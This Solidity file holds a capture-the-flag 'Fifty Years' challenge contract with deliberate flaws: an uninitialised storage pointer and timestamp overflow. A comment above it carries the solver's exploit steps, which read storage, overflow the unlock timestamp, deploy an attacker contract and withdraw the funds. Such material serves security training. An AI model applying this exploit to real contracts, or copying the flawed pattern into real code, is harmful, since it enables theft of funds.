pragma solidity ^0.4.21;

/*
const { BigNumber } = require('ethers')
var fiftyYearsChallenge = await FiftyYearsChallenge.deployed()
// length
await web3.eth.getStorageAt(fiftyYearsChallenge.address, 0);

// timestamp
await web3.eth.getStorageAt(fiftyYearsChallenge.address, 1);

// owner==index 2
await web3.eth.getStorageAt(fiftyYearsChallenge.address, 2);
await web3.eth.getStorageAt(fiftyYearsChallenge.address, 3);
await web3.eth.getStorageAt(fiftyYearsChallenge.address, 4);

const ONE_DAYS_IN_SECONDS = 24 * 60 * 60
const DATE_OVERFLOW = BigNumber.from(`2`).pow(`256`).sub(ONE_DAYS_IN_SECONDS)
await fiftyYearsChallenge.upsert(`1`, DATE_OVERFLOW.toString(), { value: `1`, })
await fiftyYearsChallenge.upsert(`2`, '0', { value: `2`, })

var queue0 = await fiftyYearsChallenge.getQueue(`0`)
var queue1 = await fiftyYearsChallenge.getQueue(`1`)
var queue2 = await fiftyYearsChallenge.getQueue(`2`)

await deployer.deploy(RetirementFundAttacker, fiftyYearsChallenge.address, { from: accounts[0], value: "2" });

web3.eth.getBalance(fiftyYearsChallenge.address)
await fiftyYearsChallenge.withdraw(`2`)

web3.eth.getBalance('0x999FDa97f87E1A8e14d24b105a6b9E582c9eC0A3')

*/

contract FiftyYearsChallenge {
    struct Contribution {
        uint256 amount;
        uint256 unlockTimestamp;
    }
    Contribution[] queue;
    uint256 head;

    address owner;
    function FiftyYearsChallenge(address player) public payable {
        require(msg.value == 1 ether);

        owner = player;
        queue.push(Contribution(msg.value, now + 50 years));
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function upsert(uint256 index, uint256 timestamp) public payable {
        require(msg.sender == owner);

        if (index >= head && index < queue.length) {
            // Update existing contribution amount without updating timestamp.
            Contribution storage contribution = queue[index];
            contribution.amount += msg.value;
        } else {
            // Append a new contribution. Require that each contribution unlock
            // at least 1 day after the previous one.
            require(timestamp >= queue[queue.length - 1].unlockTimestamp + 1 days);

            contribution.amount = msg.value;
            contribution.unlockTimestamp = timestamp;
            queue.push(contribution);
        }
    }

    // function getQueue(uint256 index) public view returns (uint256 amount, uint256 unlockTimestamp) {
    //     amount = queue[index].amount;
    //     unlockTimestamp = queue[index].unlockTimestamp;
    //     return;
    // }

    function withdraw(uint256 index) public {
        require(msg.sender == owner);
        require(now >= queue[index].unlockTimestamp);

        // Withdraw this and any earlier contributions.
        uint256 total = 0;
        for (uint256 i = head; i <= index; i++) {
            total += queue[i].amount;

            // Reclaim storage.
            delete queue[i];
        }

        // Move the head of the queue forward so we don't have to loop over
        // already-withdrawn contributions.
        head = index + 1;

        msg.sender.transfer(total);
    }
}
